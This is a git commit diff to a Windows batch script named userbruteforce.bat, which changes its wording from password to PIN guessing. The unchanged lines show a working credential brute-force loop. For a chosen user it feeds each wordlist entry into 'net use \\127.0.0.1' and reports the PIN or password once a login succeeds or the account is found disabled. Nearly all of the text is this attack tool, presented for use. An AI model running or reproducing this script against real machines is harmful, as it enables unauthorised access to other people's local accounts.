ddfe547486adbb0675494fb2233ff3b0cbeb3627
addyathomeacount-web <addyathomeacount@gmail.com>
2025-08-02 21:40:43 -0700

    Update userbruteforce.bat

--- bruteforce/userbruteforce.bat
+++ bruteforce/userbruteforce.bat
@@ -20,7 +20,7 @@ echo    ╔════════════════════╗
 echo    ║  COMMANDS:         ║
 echo    ║                    ║
 echo    ║  1. List Users     ║
-echo    ║  2. Bruteforce     ║
+echo    ║  2. Bruteforce PIN ║
 echo    ║  3. Exit           ║
 echo    ╚════════════════════╝
 :input
@@ -49,7 +49,7 @@ echo.
 echo [TARGET USER]
 set /p user=">> "
 echo.
-echo [PASSWORD LIST]
+echo [PIN LIST]
 set /p wordlist=">> "
 if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
 net user %user% >nul 2>&1
@@ -62,28 +62,28 @@ if /I "%errorlevel%" NEQ "0" (
 net use \\127.0.0.1 /d /y >nul 2>&1
 echo.
 for /f "tokens=*" %%a in (%wordlist%) do (
-  set pass=%%a
+  set pin=%%a
   call :varset
 )
 echo.
-echo [91m[%error%][0m [97mPassword not found[0m
+echo [91m[%error%][0m [97mPIN not found[0m
 pause >nul
 goto start
 
 :success
 echo.
-echo [92m[+][0m [97mPassword found: %pass%[0m
+echo [92m[+][0m [97mPIN found: %pin%[0m
 net use \\127.0.0.1 /d /y >nul 2>&1
 set user=
-set pass=
+set pin=
 echo.
 pause >nul
 goto start
 
 :varset
-net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
-echo [ATTEMPT %count%] [%pass%]
+net use \\127.0.0.1 /user:%user% %pin% 2>&1 | find "System error 1331" >nul
+echo [ATTEMPT %count%] [%pin%]
 set /a count=%count%+1
 if /I "%errorlevel%" EQU "0" goto success
 net use | find "\\127.0.0.1" >nul
-if /I "%errorlevel%" EQU "0" goto success 
+if /I "%errorlevel%" EQU "0" goto success
